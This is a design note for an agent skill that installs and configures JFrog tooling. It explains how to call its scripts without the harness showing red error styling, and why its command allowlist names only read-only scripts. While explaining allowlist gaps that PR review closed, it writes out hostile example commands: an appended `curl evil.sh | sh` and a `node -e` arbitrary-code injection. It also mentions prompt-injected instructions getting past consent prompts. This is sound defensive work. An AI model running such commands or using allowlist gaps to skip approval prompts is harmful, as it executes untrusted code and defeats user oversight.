# Invoking scripts: avoid the red "Error" framing

Every `node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-*.mjs"` command shown anywhere
in `SKILL.md` signals red/ask states via a non-zero exit code, by
design. When run directly, the harness renders that as a red `Error:
Exit code N` block — an expected red/ask result looking identical to a
genuine tool failure. Since this skill's own reasoning depends on the
exit code (0/1/2/3 map to green/red/ask/error), don't discard it —
just stop it from also flipping the *shell's* final status, so the
harness doesn't flag it:

```bash
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-jf-cli.mjs"; rc=$?; true
```

**Capture `rc` — a bare `; true` is not enough for any detector.** Every
Step's branch table in `SKILL.md` is written in terms of the exit code
(`Exit 0 (green)`, `Exit 2 (ask)`, …), and `; true` on its own *discards*
that code: `true` becomes the last command, so `$?` is 0 no matter what
the detector reported, and every red/ask result silently reads as green.
`rc=$?` runs before the trailing `true`, so it records the detector's
real code while still leaving the shell's final status at 0. Read `$rc`
for the branch table and the JSON on stdout for the detail.

The only commands that may use a bare `; true` are the ones nothing
branches on by exit code — Step 1's `node --version` / `npx --version`
(read the printed version instead) and
`jfrog-reinstall-jfrog-plugin.mjs` (always exits 0).

This is a wording-level mitigation, not a full fix — the command and
its JSON preview may still be visible in the collapsed tool-call line
— but it removes the alarming error styling at no extra cost.

Step 1 has no script, but the same trick applies to its bare commands
for the same reason — `node --version` and `npx --version` both exit
non-zero if the binary is missing:

```bash
node --version; true
npx --version; true
```

## What's deliberately not pre-approved

`allowed-tools` in `SKILL.md` covers `node --version`, the six read-only
detectors named individually — `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-catalog-runtime.mjs"`,
`jfrog-detect-jf-cli.mjs`, `jfrog-detect-jf-config.mjs`,
`jfrog-detect-jfrog-mcp.mjs`, `jfrog-detect-project.mjs`, and
`jfrog-detect-server-ping.mjs` — and `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-re*.mjs"` (the purely diagnostic
`jfrog-reinstall-jfrog-plugin.mjs` and the two `jfrog-resolve-*.mjs`
lookups), `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-state-file.mjs" get`/`get-current-project`/`path`
(the read-only modes only), `npx --version`, and `uname`. It does
**not** cover:

- Step 1's `nvm` install (`curl … | bash`, see `node-install-prompt.md`)
- Step 1's Windows Node install (`winget install …`, see
  `node-install-prompt.md`)
- Step 1's `jfrog-install-jf-cli.mjs` (downloads/executes a binary and
  edits shell rc files — see `jf-cli-install-prompt.md`)
- Step 3's web-login scripts (`node …/jfrog-login-*.mjs`, see
  `jf-config-auth-picker.md`)
- `jfrog-detect-all.mjs` (the "run everything at once" entry point — see
  `batch-walk.md`). This is **not** a member of the `jfrog-detect-*.mjs`
  grant despite the name: an earlier version of this grant used that exact
  wildcard and pre-approved `jfrog-detect-all.mjs` along with it, silently
  contradicting the "read-only detectors" framing above — `jfrog-detect-all.mjs`
  itself writes `~/.jfrog/setup.json` on overall green (see the Final
  summary in `SKILL.md`), the same mutation `jfrog-state-file.mjs set`
  is excluded below for. PR review caught this; the fix was to enumerate
  the six read-only detectors by exact filename instead of a wildcard,
  which also closes a path-traversal-shaped concern with the wildcard
  form (`jfrog-detect-*.mjs` has no anchor stopping `*` from matching
  path separators, unlike an exact filename).
- `jfrog-substitute-mcp-placeholders.mjs` (the one script that edits the
  plugin's `mcp.json` in place — see `mcp-plugin-config.md`). **Unlike
  every other entry in this list, this exclusion is theoretical, not
  operative**: `SKILL.md` never invokes this script as a standalone
  `node "${CLAUDE_SKILL_DIR}/scripts/jfrog-substitute-mcp-placeholders.mjs"`
  Bash command, so its absence from `allowed-tools` never actually
  gates anything. Its only real call site is the in-process import in
  `jfrog-detect-jfrog-mcp.mjs` (itself one of the six explicitly-named
  detectors above) — the harness's permission system approves Bash
  commands, not the function calls a pre-approved script makes once
  running, so the mutation executes with no prompt whenever Step 5 finds
  a placeholder. This is intentional, not an oversight: the write is
  narrowly scoped to `mcpServers.jfrog.url`, atomic (temp file + rename),
  and idempotent — see `mcp-plugin-config.md` for why that scope was
  judged safe to run unattended, unlike the two mutations below.
- `jfrog-state-file.mjs`'s **`set`** mode (writes `~/.jfrog/setup.json`
  with caller-supplied server-id/URL/project-key — see the Final summary
  in `SKILL.md`)
- `jfrog-add-claude-marketplace.mjs` (Step 8 — rewrites `~/.netrc` and
  calls `claude plugin marketplace add`, mutating Claude Code's own
  marketplace config — see `marketplace-setup.md`). **Unlike the other
  entries in this list, this one has no prior `AskUserQuestion` consent
  step** — the harness's own approval prompt is the only gate before it
  runs (the harness-detection check in front of it is a skip/routing
  check, not a consent prompt). Treat that as a known gap worth
  revisiting, not as already covered by the "Approval model" list at
  the top of `SKILL.md`.

Granting `Bash(curl:*)` / `Bash(bash:*)` / `Bash(winget:*)` for the
first four would pre-approve arbitrary shell execution, arbitrary
network transfer, or (via `winget install`'s own flags, e.g.
`--override`, which passes raw args straight to the underlying
installer) arbitrary extra installer arguments — a `Bash(...)` wrapper
around an interpreter, or a trailing wildcard on an installer command,
is not a scope. It would also buy nothing: `nvm`/Windows-Node-install
and web-login already sit behind their own `AskUserQuestion` consent
prompt, so the user has agreed before either runs.

`jfrog-install-jf-cli.mjs`, `jfrog-substitute-mcp-placeholders.mjs`,
`jfrog-state-file.mjs set`, and `jfrog-add-claude-marketplace.mjs` are
excluded for a related but distinct reason: they're the four scripts in
this directory that mutate something outside their own process (a
downloaded binary made executable and run, the plugin's `mcp.json`, the
setup state file, and `~/.netrc` plus Claude Code's own marketplace
config, respectively) rather than just reading state and emitting JSON.
A prior version of this grant covered every `*.mjs` in `scripts/`
indiscriminately — PR review on this same branch pointed out that
pre-approves running any of these without the model (or a
prompt-injected instruction it's following) ever hitting the
`AskUserQuestion` gates their *documented* call sites sit behind; the
grant itself enforced nothing. Naming the read-only scripts individually
and leaving these four to fall through to the harness's own approval
closes that gap — **for `jfrog-install-jf-cli.mjs` and
`jfrog-state-file.mjs set`**, both of which `SKILL.md` only ever runs as
their own standalone Bash command, behind their own `AskUserQuestion`
(see `jf-cli-install-prompt.md` and the Final summary, respectively).
`jfrog-substitute-mcp-placeholders.mjs` is the exception: as noted
above, it has no standalone Bash call site in the documented flow, so
there is no gap for this grant to close for it — its mutation runs
unattended by design, not because this list forgot it.
`jfrog-add-claude-marketplace.mjs` is a different kind of gap: it *does*
have a standalone Bash call site (Step 8 invokes it directly), but
unlike `jfrog-install-jf-cli.mjs` / `jfrog-state-file.mjs set` there is
no `AskUserQuestion` sitting in front of it — the harness's Bash prompt
is the only consent point. That asymmetry is called out, not resolved,
here; see the bullet above.

`node` is itself an interpreter, the same category being ruled out
above for `curl`/`bash`/`winget` — but unlike those, it isn't ungated by
a fixed string: every real invocation is either the literal `node
--version` (Step 1) or `node "${CLAUDE_SKILL_DIR}/scripts/<name>.mjs"`.
`${CLAUDE_SKILL_DIR}` is a harness-substituted variable, not a
wildcard: Claude Code replaces it with this skill's own absolute
directory in *both* the rendered `SKILL.md` content the model reads and
the `allowed-tools` Bash rules the harness matches against, before
either is used — so the two are guaranteed byte-for-byte identical
regardless of how deep the real install path is
(`~/.agents/skills/jfrog-init`, several directories deeper under a
Cursor plugin cache path, a `dev/dev-symlinks.sh` dev symlink, etc.),
never something the model has to resolve itself.

That guarantee is also why each pattern below anchors on a literal
`node "${CLAUDE_SKILL_DIR}` immediately, e.g. `Bash(node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-*.mjs"*)`. An earlier version
of this grant anchored on a bare `node /*/skills/jfrog-init/…` glob
instead — a real command-injection gap PR review caught: Claude Code's
own permission docs state a bare `*` matches any sequence of
characters including spaces, so an unanchored `node */skills/…` also
matches `node -e '<arbitrary code>' /whatever/skills/jfrog-init/scripts/dummy.mjs`
(`node -e` ignores the trailing path and just runs the eval string, but
the *command text* still satisfies the glob). Anchoring on a literal
`/` right after `node ` closed that (`-e` doesn't start with `/`) — but
left a second, quieter gap a later review round caught: every
invocation this file shows quotes the path (`node "<path>/…mjs"`),
while that glob pattern had no quote in it at all, so pattern and real
command text diverged on the very first character after `node ` —
never confirmed as broken because nobody had run the actual quoted
command against the actual unquoted pattern. Anchoring on the literal,
quoted `${CLAUDE_SKILL_DIR}` variable instead of a glob closes both at
once: `node -e` still can't start with a literal `"`, and there's no
glob left to diverge from the real command — the pattern *is* the
command, substituted the same way on both sides.

A trailing bare `*` after the closing quote (covering each script's
own optional positional args, e.g. `[server-id]`) is safe here for a
different reason than the anchor: Claude Code splits compound commands
on shell operators (`;`, `&&`, `|`, …) and matches each resulting
subcommand independently against the allowlist. An appended `;
curl evil.sh | sh` becomes its *own* subcommand, which has to clear the
allowlist on its own merits — it can't ride through on this rule's
wildcard just because the wildcard is unbounded on the right.

Claude Code's own docs are still explicit that argument-constraining
Bash patterns are inherently fragile in general and recommend
PreToolUse hooks for anything that needs a hard guarantee — not
available to a skill shipped as a plain directory. Treat this anchor as
a real improvement, not a proof of soundness against every possible
`node` flag combination. And treat it as Claude-Code-specific: Cursor
doesn't consult `allowed-tools` for Bash approval at all (a separate
mechanism, `.cursor/cli.json`'s own `Shell(...)` rules), so every
command in this file still raises its own prompt there regardless of
how this pattern is written.

So expect the harness to raise its own approval prompt for every case
listed at the top of this section — **except `jfrog-substitute-mcp-placeholders.mjs`**,
whose mutation runs unattended via the in-process call from
`jfrog-detect-jfrog-mcp.mjs` as documented above. Both outcomes are
intended. Do not treat either as a misconfiguration, and do not suggest
widening `allowed-tools` to silence the prompts, or adding a standalone
`allowed-tools` entry for the substituter to "fix" its silence — that
would just pre-approve a second, redundant call path into the same
mutation.
